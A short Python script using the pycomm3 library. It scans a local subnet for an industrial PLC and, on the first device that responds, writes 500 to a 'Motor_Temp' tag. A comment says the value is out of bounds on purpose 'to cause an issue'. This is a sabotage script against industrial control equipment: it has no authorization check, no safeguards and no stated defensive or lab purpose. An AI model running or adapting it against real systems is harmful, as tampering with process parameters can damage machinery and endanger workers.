import socket
import pycomm3
from pycomm3 import LogixDriver, SLC500Driver, PLC

# Function to find the IP address of the PLC
def find_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    
    # Scan the subnet for devices
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with PLC(ip) as plc:
                if plc.open():
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            continue
    return None

# Function to modify a parameter in the PLC
def modify_parameter(plc_ip, tag_name, new_value):
    try:
        # Connect to the PLC
        with PLC(plc_ip) as plc:
            if plc.open():
                # Write the new value to the specified tag
                result = plc.write((tag_name, new_value))
                if result:
                    print(f"Parameter '{tag_name}' modified to {new_value}")
                else:
                    print(f"Failed to modify parameter '{tag_name}'")
            else:
                print("Failed to connect to the PLC")
    except Exception as e:
        print(f"Error: {e}")

# Main function
def main():
    # Find the PLC IP address
    plc_ip = find_plc_ip()
    if plc_ip is None:
        print("PLC not found on the network")
        return
    
    # Define the tag and new value to modify
    tag_name = "Motor_Temp"  # Example tag to modify
    new_value = 500  # Example new value (out of bounds to cause an issue)
    
    # Modify the parameter
    modify_parameter(plc_ip, tag_name, new_value)

if __name__ == "__main__":
    main()